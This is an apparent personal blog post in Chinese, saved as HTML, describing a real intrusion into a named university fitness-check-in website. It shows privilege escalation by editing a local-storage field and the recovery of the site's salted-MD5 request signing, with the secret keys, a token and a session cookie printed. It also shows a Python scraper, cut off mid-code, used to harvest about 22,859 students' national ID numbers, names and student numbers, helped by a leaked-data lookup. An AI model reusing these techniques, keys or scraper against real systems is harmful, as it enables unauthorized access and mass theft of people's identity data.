@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-big-counter.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="XD体适能：从小洞到“脱库”本意想偷懒修改打卡数据却走偏了…… 记一次web实战的经历 摘要 web学生用户提权至管理员  可进行重置学生密码、修改学生信息等操作   学生信息泄露：  敏感性信息如全校学生的身份证号 、学院学号、姓名的对应 进一步可获得部分电话号码形如XXX****XXXX     总计22859条数据（~2.40MB） 步骤提权获取目标网址 https:&#x2F;&#x2F;xd.boxkj.c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XD体适能：从小洞到“脱库”">
+<meta property="og:url" content="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/index.html">
+<meta property="og:site_name" content="Framist&#39;s Little House">
+<meta property="og:description" content="XD体适能：从小洞到“脱库”本意想偷懒修改打卡数据却走偏了…… 记一次web实战的经历 摘要 web学生用户提权至管理员  可进行重置学生密码、修改学生信息等操作   学生信息泄露：  敏感性信息如全校学生的身份证号 、学院学号、姓名的对应 进一步可获得部分电话号码形如XXX****XXXX     总计22859条数据（~2.40MB） 步骤提权获取目标网址 https:&#x2F;&#x2F;xd.boxkj.c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210408011445406.png">
+<meta property="og:image" content="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210407162710884.png">
+<meta property="og:image" content="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210408014701320.png">
+<meta property="og:image" content="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210407191124303.png">
+<meta property="og:image" content="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210407225843633.png">
+<meta property="og:image" content="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210407231837648.png">
+<meta property="og:image" content="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210407232132848.png">
+<meta property="og:image" content="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210408004409062.png">
+<meta property="article:published_time" content="2021-04-08T00:41:28.498Z">
+<meta property="article:modified_time" content="2021-04-08T00:42:43.815Z">
+<meta property="article:author" content="Framist">
+<meta property="article:tag" content="信息安全">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="JS反爬虫">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210408011445406.png">
+
+<link rel="canonical" href="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>XD体适能：从小洞到“脱库” | Framist's Little House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Framist's Little House</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">◇ 自顶而下 - 面向未来 ◇</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Framist">
+      <meta itemprop="description" content="框架主义者的小窝">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Framist's Little House">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XD体适能：从小洞到“脱库”
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-08 08:41:28 / 修改时间：08:42:43" itemprop="dateCreated datePublished" datetime="2021-04-08T08:41:28+08:00">2021-04-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="XD体适能：从小洞到“脱库”"><a href="#XD体适能：从小洞到“脱库”" class="headerlink" title="XD体适能：从小洞到“脱库”"></a>XD体适能：从小洞到“脱库”</h1><p><em>本意想偷懒修改打卡数据却走偏了……</em></p>
+<p><em>记一次web实战的经历</em></p>
+<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
+<li><p>web学生用户提权至管理员</p>
+<ul>
+<li>可进行重置学生密码、修改学生信息等操作</li>
+</ul>
+</li>
+<li><p>学生信息泄露：</p>
+<ul>
+<li>敏感性信息如全校学生的<strong>身份证号</strong> 、学院学号、姓名的对应</li>
+<li>进一步可获得部分电话号码形如<code>XXX****XXXX</code></li>
+</ul>
+</li>
+</ul>
+<p><img src="/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210408011445406.png" alt="image-20210408011445406"></p>
+<p>总计22859条数据（~2.40MB）</p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>获取目标网址 <a target="_blank" rel="noopener" href="https://xd.boxkj.com/">https://xd.boxkj.com/</a></p>
+<p><em>这里我是通过反编译电表APP获得的，走了远路….</em></p>
+<p>修改Web本地储存的<code>ida</code>等字段可提权自管理员（大概类似于教师的权限）</p>
+<p><img src="/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210407162710884.png" alt="image-20210407162710884"></p>
+<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>扫端口没有什么发现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Connection to 117.34.70.45 25 port [tcp/*] succeeded!</span><br><span class="line">Connection to 117.34.70.45 80 port [tcp/*] succeeded!</span><br><span class="line">Connection to 117.34.70.45 110 port [tcp/*] succeeded!</span><br><span class="line">Connection to 117.34.70.45 443 port [tcp/*] succeeded!</span><br></pre></td></tr></table></figure>
+
+<p>数据库用了现代防火墙防御，注入应该很困难，所以放弃，<strong>准备爬</strong></p>
+<p><img src="/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210408014701320.png" alt="image-20210408014701320"></p>
+<p>找到泄露信息的关键POST</p>
+<p><img src="/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210407191124303.png" alt="image-20210407191124303"></p>
+<p>另外一个地方可以获得一些信息。不过先就考虑获取上面那段信息</p>
+<p><img src="/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210407225843633.png" alt="image-20210407225843633"></p>
+<p>但自己直接用POST返回认证失败：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;returnCode&quot;</span>:<span class="number">601</span>,<span class="attr">&quot;returnMsg&quot;</span>:<span class="string">&quot;认证失败&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>关注POST头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;app&#x2F;getStuInfo HTTP&#x2F;2</span><br><span class="line">Host: xd.boxkj.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko&#x2F;20100101 Firefox&#x2F;88.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">type: 0</span><br><span class="line">channel: H5</span><br><span class="line">version: 99999</span><br><span class="line">token: 1d5d4b73-65a8-4c7f-b665-70fbd13c9bc9</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">sign: 26995cb7d75f0069a18f512ec6d86171</span><br><span class="line">timestamp: 1617816971960</span><br><span class="line">Content-Length: 19</span><br><span class="line">Origin: https:&#x2F;&#x2F;xd.boxkj.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: https:&#x2F;&#x2F;xd.boxkj.com&#x2F;</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">TE: Trailers</span><br></pre></td></tr></table></figure>
+
+<p>关注<code>sign</code>字段，在不同的学号请求下会改变</p>
+<p>在学号为<code>19169100001</code>时：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sign: </span><br><span class="line">26995cb7d75f0069a18f512ec6d86171</span><br></pre></td></tr></table></figure>
+
+
+
+<p>比较像md5，但自己试了许久却没有发现加密算法</p>
+<p>应该是JS反爬虫措施，于是重点关注JavaScript</p>
+<h3 id="反JS反爬虫"><a href="#反JS反爬虫" class="headerlink" title="反JS反爬虫"></a>反JS反爬虫</h3><p><code>Ctrl+F</code>与代码审计发现以下关键代码：</p>
+<p>做了一些混淆处理却没有什么用（竟然还保留了注释）</p>
+<p><img src="/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210407231837648.png" alt="image-20210407231837648"></p>
+<p>大概可解析如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">exports</span>, <span class="string">&quot;__esModule&quot;</span>, &#123;</span><br><span class="line">    value: <span class="literal">true</span></span><br><span class="line">                                             &#125;);</span><br><span class="line"><span class="built_in">exports</span>.default = <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> _sign = __webpack_require__(<span class="comment">/*! @/util/sign.js */</span> <span class="string">&quot;./src/util/sign.js&quot;</span>);</span><br><span class="line"><span class="comment">// 参数： url:请求地址</span></span><br><span class="line"><span class="comment">// param：请求参数</span></span><br><span class="line"><span class="comment">// way：请求方式</span></span><br><span class="line"><span class="comment">// res：回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_urlRequest</span>(<span class="params">url, param, way, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 获取自定义的code</span></span><br><span class="line">    <span class="comment">//let code = uni.getStorageSync(\&#x27;code\&#x27;)</span></span><br><span class="line">    <span class="keyword">var</span> sign = (<span class="number">0</span>, _sign.getSign)(param,<span class="string">&quot;3685bc028aaf4e64ad6b5d2349d24ba8&quot;</span>, <span class="string">&quot;e8167ef026cbc5e456ab837d9d6d9254&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>发现加密脚本路径：<code>/src/util/sign.js</code></p>
+<p><img src="/2021/04/08/XD%E4%BD%93%E9%80%82%E8%83%BD%E8%84%B1%E5%BA%93/image-20210407232132848.png" alt="image-20210407232132848"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;getSign&#125; <span class="keyword">from</span> <span class="string">&#x27;@/util/sign.js&#x27;</span></span><br><span class="line"><span class="comment">// 参数： url:请求地址</span></span><br><span class="line"><span class="comment">// param：请求参数</span></span><br><span class="line"><span class="comment">// way：请求方式</span></span><br><span class="line"><span class="comment">// res：回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlRequest</span>(<span class="params">url, param, way, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 获取自定义的code</span></span><br><span class="line">    <span class="comment">//let code = uni.getStorageSync(&#x27;code&#x27;)</span></span><br><span class="line">	<span class="keyword">let</span> sign = getSign(param,<span class="string">&quot;3685bc028aaf4e64ad6b5d2349d24ba8&quot;</span>,<span class="string">&quot;e8167ef026cbc5e456ab837d9d6d9254&quot;</span>); <span class="comment">//关键加密参数</span></span><br><span class="line">	uni.showLoading(&#123;</span><br><span class="line">	    title: <span class="string">&#x27;加载中&#x27;</span></span><br><span class="line">	&#125;);</span><br><span class="line">    <span class="comment">// 进行请求</span></span><br><span class="line">    uni.request(&#123;</span><br><span class="line">        url: url,</span><br><span class="line">        data: param,</span><br><span class="line">        header: &#123;</span><br><span class="line">            type: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">            channel : <span class="string">&#x27;H5&#x27;</span>,</span><br><span class="line">            version : <span class="string">&#x27;99999&#x27;</span>,</span><br><span class="line">			token:uni.getStorageSync(<span class="string">&#x27;uniIdToken&#x27;</span>),</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">			sign : sign,</span><br><span class="line">			timestamp : (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 获取设置请求方式</span></span><br><span class="line">        method: way,</span><br><span class="line">        success: <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">            rsuccess(res,data);</span><br><span class="line">        &#125;,fail(e) &#123;</span><br><span class="line">			uni.showModal(&#123;</span><br><span class="line">				content: <span class="built_in">JSON</span>.stringify(e),</span><br><span class="line">				showCancel: <span class="literal">false</span></span><br><span class="line">			&#125;)</span><br><span class="line">			uni.hideLoading();</span><br><span class="line">		&#125;</span><br><span class="line">					</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>主要加密方法如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSign</span>(<span class="params">params, kAppKey, kAppSecret</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> paramsStrSort(params, kAppKey, kAppSecret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">paramsStrSort</span>(<span class="params">paramsStr, kAppKey, kAppSecret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> url = paramsStr + <span class="string">&quot;&amp;appId=&quot;</span> + kAppKey+ <span class="string">&#x27;&amp;appSecret=&#x27;</span> + kAppSecret;</span><br><span class="line">    <span class="keyword">var</span> urlStr = url.split(<span class="string">&quot;&amp;&quot;</span>).sort().join(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> md5(urlStr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>算法为加盐md5，用python改写一下就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">userNum: int</span>):</span></span><br><span class="line">    url = <span class="string">&quot;userNum=&quot;</span> + str(userNum) + <span class="string">&quot;&amp;appId=&quot;</span> + <span class="string">&quot;3685bc028aaf4e64ad6b5d2349d24ba8&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;&amp;appSecret=&#x27;</span> + <span class="string">&quot;e8167ef026cbc5e456ab837d9d6d9254&quot;</span></span><br><span class="line">    urlStr = url.split(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">    urlStr.sort()</span><br><span class="line">    urlStr = <span class="string">&quot;&amp;&quot;</span>.join(urlStr)</span><br><span class="line">    <span class="keyword">return</span> md5((urlStr.encode(<span class="string">&#x27;utf-8&#x27;</span>))).hexdigest()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="时间截处理"><a href="#时间截处理" class="headerlink" title="时间截处理"></a>时间截处理</h3><p>发现服务器对头文件里的时间截也有要求。简单修改一下代码就好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">headerString = headerString1 + sign(userNum) + <span class="string">&quot;\ntimestamp: &quot;</span> + str(int(time.time()*<span class="number">1000</span>)) + headerString2</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="社工库使用"><a href="#社工库使用" class="headerlink" title="社工库使用"></a>社工库使用</h3><p>使用西电社工库减小学号搜索范围</p>
+<h3 id="爬取信息"><a href="#爬取信息" class="headerlink" title="爬取信息"></a>爬取信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm                           <span class="comment">#进度条</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headerString1 = <span class="string">&quot;&quot;&quot;Host: xd.boxkj.com</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span></span><br><span class="line"><span class="string">Accept: */*</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="string">type: 0</span></span><br><span class="line"><span class="string">channel: H5</span></span><br><span class="line"><span class="string">version: 99999</span></span><br><span class="line"><span class="string">token: 1d5d4b73-65a8-4c7f-b665-70fbd13c9bc9</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">sign: &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">headerString2 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: 19</span></span><br><span class="line"><span class="string">Origin: https://xd.boxkj.com</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">Referer: https://xd.boxkj.com/</span></span><br><span class="line"><span class="string">Cookie: JSESSIONID=0270007DC6DA2635CEF27281E029C640</span></span><br><span class="line"><span class="string">TE: Trailers&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">userNum: int</span>):</span></span><br><span class="line">    url = <span class="string">&quot;userNum=&quot;</span> + str(userNum) + <span class="string">&quot;&amp;appId=&quot;</span> + <span class="string">&quot;3685bc028aaf4e64ad6b5d2349d24ba8&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;&amp;appSecret=&#x27;</span> + <span class="string">&quot;e8167ef026cbc5e456ab837d9d6d9254&quot;</span></span><br><span class="line">    urlStr = url.split(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">    urlStr.sort()</span><br><span class="line">    urlStr = <span class="string">&quot;&amp;&quot;</span>.join(urlStr)</span><br><span class="line">    <span class="keyword">return</span> md5((urlStr.encode(<span class="string">&#x27;utf-8&#x27;</span>))).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(sign(19169100001))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getheaderDict</span>(<span class="params">userNum: int, headerString1, headerString2</span>):</span></span><br><span class="line"></span><br><span class="line">    headerString = headerString1 + sign(userNum) + <span class="string">&quot;\ntimestamp: &quot;</span> + str(int(time.time()*<span class="number">1000</span>)) + headerString2</span><br><span class="line">    headerDict = 